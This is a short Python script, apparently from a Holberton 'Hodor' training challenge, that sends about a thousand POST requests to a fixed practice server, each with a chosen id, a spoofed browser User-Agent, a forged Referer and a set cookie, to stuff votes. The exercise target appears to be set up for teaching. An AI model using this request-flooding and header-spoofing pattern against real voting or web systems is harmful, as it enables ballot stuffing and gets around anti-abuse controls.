#!/usr/bin/python3
"""
Hodor - Hbtn project

Level 2: HTTP request with parameters, cookies and User-Agent

Usage: python3 requester_2.py [id]

Author: @exploitpnk
"""
import requests
import sys

if len(sys.argv) == 2:
    url = "http://158.69.76.135/level2.php"
    user_id = sys.argv[1]
    data = {
        "id": user_id,
        "holdthedoor": "Submit+Query",
        "key": "0"
        }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) Safari/537.36",
        "Cookie": "HoldTheDoor=0",
        "Referer": "http://158.69.76.135/level2.php"
        }
    for i in range(1, 1024):
        response = requests.post(url=url, data=data, headers=headers)
        print("[#] Request", i, "sent: HTTP code:", response.status_code)
else:
    print("Usage: python", sys.argv[0], "[id]")
